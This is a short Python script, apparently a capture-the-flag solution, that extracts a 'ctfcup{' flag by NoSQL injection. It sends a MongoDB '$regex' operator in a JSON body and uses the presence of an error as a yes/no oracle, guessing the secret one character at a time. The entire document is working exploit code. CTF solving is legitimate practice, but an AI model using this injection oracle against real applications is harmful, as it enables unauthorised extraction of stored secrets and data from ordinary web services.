import requests
import sys

URL = sys.argv[1]

AL = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}"


def main():
    def check_prefix(prefix):
        prefix = prefix.replace("{", "\\{").replace("}", "\\}")
        r = requests.session()
        r.post("http://localhost:5000", json={"content": {"$regex": f"^{prefix}"}})
        session = r.cookies["session"]
        return (
            requests.get(f"{URL}/strings", cookies={"session": session})
            .json()
            .get("error")
            is not None
        )

    flag_prefix = "ctfcup{"
    while True:
        for c in AL:
            if check_prefix(flag_prefix + c):
                flag_prefix += c
                break
        print(flag_prefix)


if __name__ == "__main__":
    main()
